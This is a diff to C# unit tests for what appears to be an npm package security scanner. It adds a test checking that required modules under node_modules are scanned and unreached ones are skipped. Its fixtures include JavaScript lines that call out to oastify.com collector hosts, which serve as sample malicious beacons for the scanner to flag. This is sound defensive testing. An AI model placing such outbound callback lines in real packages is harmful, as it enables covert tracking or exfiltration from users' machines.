@@ -201,12 +201,28 @@ public sealed class PackageReviewTests : IDisposable
     public void A_payload_in_a_module_under_node_modules_keeps_its_level()
     {
         var r = Review(Tgz("nested.tgz", ("package/package.json", Preinstall), ("package/index.js", "require('helper');"),
-            ("package/node_modules/helper/package.json", """{"name":"helper","main":"lib/main.js"}"""), ("package/node_modules/helper/lib/main.js", HiddenUrl),
-            ("package/node_modules/other/index.js", "require('https').get('https://x1.oastify.com/');")));
+            ("package/node_modules/helper/package.json", """{"name":"helper","main":"lib/main.js"}"""), ("package/node_modules/helper/lib/main.js", HiddenUrl)));
         var f = HiddenUrlFinding(r);
         Assert.Equal("noteworthy", f.Level);
         Assert.Contains("package/index.js > package/node_modules/helper/lib/main.js", f.Detail, StringComparison.Ordinal);
-        Assert.Contains(r.Findings, x => x is { Rule: "package/collection-url", Level: "noteworthy", Path: "package/node_modules/other/index.js" });
+    }
+
+    [Fact]
+    public void A_module_the_package_code_requires_is_read_and_unreached_node_modules_files_are_not()
+    {
+        var files = new List<(string, string)>
+        {
+            ("package/package.json", """{"name":"layout-check","version":"1.0.0","main":"main.js"}"""),
+            ("package/main.js", "module.exports = require('./lib/util');"),
+            ("package/lib/util.js", "module.exports = require('reached');"),
+            ("package/node_modules/reached/index.js", "require('https').get('https://x1.oastify.com/');"),
+        };
+        for (int i = 0; i < 300; i++) files.Add(($"package/node_modules/dep{i}/index.js", $"module.exports = {i};"));
+        files.Add(("package/node_modules/unreached/index.js", "require('https').get('https://x2.oastify.com/');"));
+        var r = Review(Tgz("bundled.tgz", [.. files]));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/collection-url", Level: "noteworthy", Path: "package/node_modules/reached/index.js" });
+        Assert.DoesNotContain(r.Findings, f => f.Path == "package/node_modules/unreached/index.js");
+        Assert.Null(r.Partial);
     }
 
     [Theory]
